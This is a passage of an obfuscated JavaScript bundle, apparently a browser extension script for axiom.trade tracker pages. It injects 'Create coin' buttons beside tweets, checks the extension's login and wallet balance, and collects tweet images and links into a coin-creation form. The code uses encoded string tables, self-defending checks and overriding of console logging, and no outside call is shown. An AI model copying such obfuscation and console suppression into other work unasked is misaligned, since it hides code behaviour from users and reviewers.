      "AhjLzG",
      "Dg9mB3DLCKnHCW",
      "ign1CNnVCJOGCa",
      "Dgv4DenVBNrLBG",
      "BI1IDg4",
      "DMzttei",
      "yxbWBhK",
      "yxbWzw5Kq2HPBa",
      "oueXoWOGicaGia",
      "zM9YrwfJAa",
      "BY53lwz1BgWUBq",
      "zNjVBq",
      "Aw5NoIa0ChGGoa",
      "Aw4TyNrU",
      "zgvMyxvSDfnVBa",
      "C3rLBMvY",
      "z2v0u2v0DgLUzW",
      "ywrKrxzLBNrmAq",
      "ngnIrhHZCq",
      "ztSkicaGicaGia",
      "ndbqtNfWswi",
      "CxvLCNLtzwXLyW",
      "cIaGicaGicaGlG",
      "yxvSDa",
      "yw0Uy29T",
      "yvT0yxjNzxq9iG",
      "BwvZC2fNzq",
      "ChjLDMvUDerLzG",
      "zNvSBcbPBwC",
      "Dg9tDhjPBMC",
      "lM14lwf1Dg8UDW",
      "z2v0uNbJq2XPzq",
      "y2rUAw5ZDgfNCG",
      "y3jLyxrLlwnVAq",
      "Bg9N",
      "yMLUza",
      "zw50",
      "BxrcqK4",
      "y2XPy2S",
      "Dw5KzwqTzNvSBa",
      "icbIywnRz3jVDq",
      "y29UC3rYDwn0BW",
      "CMrLCJOGBM9Uzq",
      "vffvB3i",
      "icaGicbHBgLNBG",
      "BwCSic5YzwXHDa",
      "mJaXndyWs2zcuNre",
      "Dg9YqwXS",
      "Dg9Y",
      "yxaTxfS0ChHCxq",
      "nJe0me1Vuuzjvq",
      "yxGTDY1CwZyWma",
      "yNjHzNC",
      "lNjLBgf0AxzLlG",
      "Aw5JBhvKzxm",
      "Aw9U",
      "mKHiv01Wyq",
      "yvTOCMvMxq",
      "CgfYzw50tM9Kzq",
      "wfb2AwO",
      "zw50AwnHDgvK",
      "DfnPyMXPBMC",
      "D2LSweq",
      "y3LZwuS",
      "DgvZDa",
      "ntG0ntvJAhnwy1O",
      "vw5RBM93BIbLCG",
      "vK1qqLO",
      "zg1evK4",
      "BvHRA2O",
      "oIbPBMXPBMuTzG",
      "AxzLlNCTnY5Olq",
    ];
    return (EO = function () {
      return t;
    })();
  }
  BO(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const xO = {
    matches: ["https://*.axiom.trade/trackers"],
    runAt: "document_idle",
    main() {
      const t = 292,
        e = 240,
        n = 254,
        r = 279,
        o = 227,
        i = 221,
        s = 273,
        a = 265,
        u = 298,
        c = 229,
        l = 301,
        d = 296,
        f = 246,
        h = 303,
        p = 271,
        m = 218,
        g = 198,
        y = 289,
        w = 286,
        v = 269,
        A = 226,
        k = 207,
        I = 288,
        S = 250,
        _ = 252,
        T = 284,
        C = 241,
        E = 255,
        x = 196,
        P = 211,
        R = 267,
        O = 226,
        M = 207,
        L = 289,
        N = 240,
        D = 262,
        U = 289,
        q = 248,
        W = 208,
        z = 299,
        K = 231,
        F = 280,
        j = 217,
        G = 248,
        V = 193,
        H = 228,
        X = 274,
        Z = 245,
        J = 256,
        Y = 193,
        Q = 299,
        $ = 231,
        tt = 194,
        et = 288,
        nt = 300,
        rt = 289,
        ot = 197,
        it = 258,
        st = 234,
        at = 277,
        ut = 244,
        ct = 263,
        lt = 232,
        dt = 253,
        ft = 281,
        ht = 215,
        pt = 260,
        mt = 200,
        gt = 285,
        yt = 205,
        wt = 209,
        bt = 248,
        vt = 230,
        At = 274,
        kt = PO,
        It = {
          ZTNyQ: "style",
          rFEyk: "Create coin",
          YnGAm: "DOMContentLoaded",
          ILyhI: "span.text-textTertiary",
          XPvij: "div.mx-aut" + kt(251) + kt(t) + "px\\]",
          wVAax: function (t, e) {
            return t < e;
          },
          VMPBZ: kt(e) + kt(n),
          alFpF: function (t, e) {
            return t(e);
          },
          dmDVN: function (t) {
            return t();
          },
          cysYK: kt(r),
          nJphl: kt(o),
          xiaac:
            ".flex.items-center.g" + kt(290) + ", .flex.items-center" + kt(i),
          Gonrj: kt(s) + kt(a),
          vQWoY: "poster",
          sqnoX: "video",
          DyRHH: "video source",
          TQUor: kt(u),
          ogNpn: function (t, e) {
            return t instanceof e;
          },
          lfypi: function (t, e) {
            return t === e;
          },
          vfSLB: function (t, e) {
            return t(e);
          },
          YOGrj: "Unknown error",
          bmCBy: function (t, e) {
            return t === e;
          },
        };
      It.alFpF(IO, "dark");
      const St = () => {
          const t = kt,
            e = document[t(st) + t(at)](It.ZTNyQ);
          (e[t(ut) + "t"] =
            t(ct) +
            "create-coin-btn {\n  " +
            t(lt) +
            "rgin-left: 8px;\n          padd" +
            t(dt) +
            "px;\n          font-size: 12px;\n         " +
            t(243) +
            "ointer;\n          bo" +
            t(283) +
            ";\n          border-radius: 4px;\n        " +
            t(ft) +
            "nd-color: #008CBA;\n          color: white;\n       " +
            t(ht) +
            "ion: background-color 0.2s eas" +
            t(pt) +
            "   display" +
            t(mt) +
            "lex;\n     " +
            t(gt) +
            "-items: center;\n          justify-content: center;\n          height: 24px;\n        }\n        .create" +
            t(yt) +
            "hover {\n  " +
            t(225) +
            t(239) +
            "olor: #007" +
            t(249) +
            t(wt) +
            " "),
            document.head[t(bt) + "d"](e);
          const n = {};
          return (
            (n[t(vt)] = t(At) + t(245)),
            (n[t(244) + "t"] = It.rFEyk),
            Object.assign(document.createElement("button"), n)
          );
        },
        _t = () => {
          const t = kt,
            e = document[t(262) + t(288)](It.ILyhI);
          for (let r = 0; r < e.length; ++r)
            e[r].textContent &&
              /^\d+[hm]$/[t(tt)](e[r][t(244) + "t"]) &&
              Tt(e[r]);
          const n = document["querySelec" + t(et)](It[t(nt)]);
          for (let r = 0; It.wVAax(r, n.length); ++r)
            !n[r]["querySelec" + t(rt)](It[t(ot)]) && It.alFpF(Ct, n[r]);
        },
        Tt = (t) => {
          var e, n;
          const r = 268,
            o = 264,
            i = kt;
          if (
            null == (e = t[i(H) + i(302)])
              ? void 0
              : e.classList.contains(i(X) + i(Z))
          )
            return;
          const s = It.dmDVN(St);
          s["addEventLi" + i(J)](It[i(Y)], (e) => {
            const n = i;
            e[n(r) + n(o)](), e.stopPropagation(), Bt(t);
          }),
            null == (n = t[i(Q)]) ? void 0 : n.insertBefore(s, t[i($) + "g"]);
        },
        Ct = (t) => {
          var e, n, r;
          const o = 264,
            i = kt;
          if (t["querySelec" + i(L)](i(N) + "in-btn")) return;
          const s = St();
          let a = ![];
          const u = Array.from(t[i(D) + "torAll"](It.nJphl)).find((t) => {
            var e;
            return (
              "retweeted" ===
              (null == (e = t.textContent)
                ? void 0
                : e[i(235)]()[i(242) + "e"]())
            );
          });
          if (
            (u &&
              (null == (e = u.parentNode)
                ? void 0
                : e.insertBefore(s, u.nextSibling),
              (a = !![])),
            !a)
          ) {
            const e = t["querySelec" + i(U)](It.xiaac);
            e && (e[i(q) + "d"](s), (a = !![]));
          }
          if (!a) {
            const e = t.querySelector("span.text-" + i(W) + "ry");
            e &&
              (null == (n = e[i(z)])
                ? void 0
                : n.insertBefore(s, e[i(K) + "g"]),
              (a = !![]));
          }
          if (!a) {
            const e = t.querySelector(".relative.w-7.h-7.ro" + i(F));
            e &&
              (null == (r = e.parentNode)
                ? void 0
                : r[i(j) + "re"](s, e[i(K) + "g"]),
              (a = !![]));
          }
          !a && t[i(G) + "d"](s),
            s.addEventListener(It[i(V)], (e) => {
              e["preventDef" + i(o)](), e.stopPropagation(), Bt(t);
            });
        },
        Bt = async (t) => {
          var e;
          const n = kt;
          try {
            const r = Xg[n(c) + "e"]();
            if (!r["isUserAuth" + n(l)]()) {
              if (!(await hy(() => r.isUserAuthenticated() === !![])))
                return B(null), void 0;
            }
            if (!r.hasToken()) {
              if (!(await It.vfSLB(hy, () => r.hasToken() === !![])))
                return B(null), void 0;
            }
            const o = Jg.getInstance();
            if (o.hasWallet()) {
              const t = o[n(206)]();
              await (null == (e = Og[n(272) + "nt"]())
                ? void 0
                : e.getCachedBalance(null == t ? void 0 : t.publicKey));
            }
            await FR(r[n(224) + n(d)]()),
              B(
                ((t) => {
                  var e;
                  const n = 303,
                    r = 226,
                    o = 295,
                    i = 295,
                    s = 223,
                    a = kt,
                    u = {};
                  u[a(h)] = "src";
                  const c = u,
                    l = t[a(214)](a(p) + a(m) + "w-\\[600px\\]") || t;
                  if (!l) return It[a(g)](b);
                  try {
                    const t =
                        (null ==
                        (e = l["querySelec" + a(y)](
                          a(266) +
                            '_blank"] i' +
                            a(w) +
                            a(201) +
                            "7.rounded-" +
                            a(v)
                        ))
                          ? void 0
                          : e[a(A) + "te"](a(k))) || "",
                      u = [];
                    l.querySelectorAll(
                      a(294) +
                        'w-5.h-5.rounded-full img, [class*="rounded-full"] img'
                    ).forEach((e) => {
                      const n = a,
                        r = e[n(O) + "te"](n(M));
                      r && !r.includes(t) && u[n(223)](r);
                    });
                    const d = [t, ...u].filter(Boolean),
                      f = [];
                    l["querySelec" + a(I)]("img").forEach((t) => {
                      const e = a,
                        n = t.getAttribute("src");
                      n &&
                        !n[e(o)]("profile_images") &&
                        !n[e(i)](It.Gonrj) &&
                        f[e(s)](n);
                    }),
                      l["querySelec" + a(I)](It.sqnoX).forEach((t) => {
                        const e = t[a(r) + "te"](It.vQWoY);
                        e && f.push(e);
                      }),
                      l.querySelectorAll(It.DyRHH)[a(S)]((t) => {
                        const e = a,
                          r = t.getAttribute(c[e(n)]);
                        r && f.push(r);
                      });
                    let h = "";
                    const p = Array[a(_)](l["querySelec" + a(I)](It[a(T)]));
                    if (p[a(222)] > 0) {
                      const t = p.find((t) =>
                        /twitter\.com\/\w+\/status\/\d+|x\.com\/\w+\/status\/\d+/[
                          a(194)
                        ](t.href)
                      );
                      t && (h = t[a(C)]);
                    }
                    const m = Zg[a(229) + "e"]()[a(257) + "s"]();
                    return {
                      coinName: "",
                      ticker: "",
                      initialLiquidity:
                        (null == m ? void 0 : m[a(E)].toString()) || "1",
                      twitterUrl: h,
                      websiteUrl: "",
                      images: [...d, ...f].filter(Boolean),
                      selectedImage: d[0] || f[0] || "",
                    };
                  } catch (d) {
                    return (
                      a(x) + a(P),
                      It.ogNpn(d, Error)
                        ? d[a(R)]
                        : "string" == typeof d ||
                          (d &&
                            It[a(219)](typeof d, "object") &&
                            JSON.stringify(d)),
                      null
                    );
                  }
                })(t)
              );
          } catch (r) {
            It.YOGrj,
              r instanceof Error
                ? r.message
                : It.bmCBy(typeof r, "string") ||
                  (r && "object" == typeof r && JSON.stringify(r)),
              It[n(f)](B, null);
          }
        };
      (() => {
        const t = kt,
          e = new MutationObserver(_t),
          n = { childList: !![] };
        (n[t(216)] = !![]),
          e.observe(document[t(236)], n),
          document[t(it) + t(256)](It.YnGAm, _t);
      })();
    },
  };
  function PO(t, e) {
    const n = EO();
    return (
      (PO = function (e, r) {
        let o = n[(e -= 193)];
        if (void 0 === PO.areaiY) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (PO.VZPADC = i), (t = arguments), (PO.areaiY = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.VxdzlP = t),
              (this.piXRfl = [1, 0, 0]),
              (this.WDodcl = function () {
                return "newState";
              }),
              (this.gtNaxO = "\\w+ *\\(\\) *{\\w+ *"),
              (this.Brrzdv = "['|\"].+['|\"];? *}");
          };
          (e.prototype.lerbvF = function () {
            const t = new RegExp(this.gtNaxO + this.Brrzdv).test(
              this.WDodcl.toString()
            )
              ? --this.piXRfl[1]
              : --this.piXRfl[0];
            return this.IvFkuc(t);
          }),
            (e.prototype.IvFkuc = function (t) {
              return Boolean(~t) ? this.NXNwpE(this.VxdzlP) : t;
            }),
            (e.prototype.NXNwpE = function (t) {
              for (let e = 0, n = this.piXRfl.length; e < n; e++)
                this.piXRfl.push(Math.round(Math.random())),
                  (n = this.piXRfl.length);
              return t(this.piXRfl[0]);
            }),
            new e(PO).lerbvF(),
            (o = PO.VZPADC(o)),
            (t[s] = o);
        }
        return o;
      }),
      PO(t, e)
    );
  }
  axiom;
  const RO = MO;
  function OO(t, ...e) {
    const n = 350,
      r = 355,
      o = 361,
      i = 349,
      s = 358,
      a = 359,
      u = 359,
      c = 372,
      l = 352,
      d = RO,
      f = {
        cEqiO: "(((.+)+)+)+$",
        pVAPD: function (t, e) {
          return t(e);
        },
        lXruj: function (t, e) {
          return t + e;
        },
        Bdjuh: d(377) + 'ctor("retu' + d(360) + " )",
        cJukT: "warn",
        ikFCD: d(n),
        NKqqY: "trace",
        qovzq: d(r),
        IDrhw: "[wxt]",
      },
      h = (function () {
        const t = 368;
        let e = !![];
        return function (n, r) {
          const o = e
            ? function () {
                if (r) {
                  const e = r[MO(t)](n, arguments);
                  return (r = null), e;
                }
              }
            : function () {};
          return (e = ![]), o;
        };
      })(),
      p = h(this, function () {
        const t = d;
        return p[t(u)]()
          .search("(((.+)+)+)+$")
          [t(u)]()
          .constructor(p)
          [t(c)](f[t(l)]);
      });
    p();
    const m = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })();
    if (
      (m(this, function () {
        const t = d;
        let e;
        try {
          e = f[t(o)](
            Function,
            f.lXruj("return (function() ", f[t(370)]) + ");"
          )();
        } catch (u) {
          e = window;
        }
        const n = (e[t(i)] = e.console || {}),
          r = [
            t(s),
            f[t(354)],
            f.ikFCD,
            "error",
            "exception",
            "table",
            f.NKqqY,
          ];
        for (let o = 0; o < r.length; o++) {
          const e = m.constructor.prototype.bind(m),
            i = r[o],
            s = n[i] || e;
          (e.__proto__ = m.bind(m)), (e.toString = s[t(a)].bind(s)), (n[i] = e);
        }
      })(),
      ![])
    )
      if (typeof e[0] === f.qovzq) {
        t("[wxt] " + e.shift(), ...e);
      } else t(f.IDrhw, ...e);
  }
  function MO(t, e) {
    const n = LO();
    return (
      (MO = function (e, r) {
        let o = n[(e -= 349)];
        if (void 0 === MO.RooEqy) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (MO.vuSvsO = i), (t = arguments), (MO.RooEqy = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.ujgALQ = t),
              (this.JvdJDA = [1, 0, 0]),
              (this.tATvbc = function () {
                return "newState";
              }),
              (this.VbYuLt = "\\w+ *\\(\\) *{\\w+ *"),
              (this.faIGaC = "['|\"].+['|\"];? *}");
          };
          (e.prototype.EuXrgp = function () {
            const t = new RegExp(this.VbYuLt + this.faIGaC).test(
              this.tATvbc.toString()
            )
              ? --this.JvdJDA[1]
              : --this.JvdJDA[0];
            return this.XfHLwe(t);
          }),
            (e.prototype.XfHLwe = function (t) {
              return Boolean(~t) ? this.QgXluZ(this.ujgALQ) : t;
            }),
            (e.prototype.QgXluZ = function (t) {
              for (let e = 0, n = this.JvdJDA.length; e < n; e++)
                this.JvdJDA.push(Math.round(Math.random())),
                  (n = this.JvdJDA.length);
              return t(this.JvdJDA[0]);
            }),
            new e(MO).EuXrgp(),
            (o = MO.vuSvsO(o)),
            (t[s] = o);
        }
        return o;
      }),
      MO(t, e)
    );
  }
  function LO() {
    const t = [
      "m2z5Dhr6DG",
      "zgvIDwC",
      "B24GC3rHCNr1Ca",
      "E30Uy29UC3rYDq",
      "y29UC29Szq",
      "Aw5MBW",
      "mZqYndm4mhfbwM9RCa",
      "y0vXAu8",
      "wKTMv28",
      "y0P1A1q",
      "C3rYAw5N",
      "BwfPBG",
      "iIbJCMfZAgvKia",
      "Bg9N",
      "Dg9tDhjPBMC",
      "CM4GDgHPCYiPka",
      "Cfzbueq",
      "mZiYnZe1nJHrwNDzu2S",
      "ntyXmJG3mLj6s2fTsG",
      "zxjYB3i",
      "mtq5oty3n3n1EuTvCa",
      "C2TdCNLWDa",
      "mtiZntK1mKjcDvrgwa",
      "yxbWBhK",
      "odC0mtGXn3HmEhzTDW",
      "qMrQDwG",
      "ndaYmZm2mgrluujzCW",
      "C2vHCMnO",
      "vgHLihvUBgLZDa",
    ];
    return (LO = function () {
      return t;
    })();
  }
  (function (t) {
    const e = 367,
      n = 363,
      r = 351,
      o = 371,
      i = 362,
      s = MO,
      a = t();
    for (; []; )
      try {
        if (
          855240 ===
          parseInt(s(365)) / 1 +
            (-parseInt(s(e)) / 2) * (parseInt(s(374)) / 3) +
            parseInt(s(n)) / 4 +
            parseInt(s(r)) / 5 +
            parseInt(s(o)) / 6 +
            parseInt(s(369)) / 7 +
            -parseInt(s(i)) / 8
        )
          break;
        a.push(a.shift());
      } catch (PA) {
        a.push(a.shift());
      }
  })(LO),
    (window[RO(366)] = function (t) {
      return function () {
        return t;
      };
    });
  const NO = {
    debug: (...t) => OO(console[RO(375)], ...t),
    log: (...t) => OO(console.log, ...t),
    warn: (...t) => OO(console.warn, ...t),
    error: (...t) => OO(console[RO(364)], ...t),
  };
  return (async () => {
    const t = 356,
      e = 364,
      n = 373,
      r = 357,
      o = RO,
      i = { ZKfWo: "axiom" },
      s = i;
    try {
      return await xO[o(t)]();
    } catch (a) {
      throw (
        (NO[o(e)](o(n) + 'ed script "' + s[o(353)] + (o(r) + o(376)) + "!", a),
        a)
      );
    }
  })();
})();
axiom;
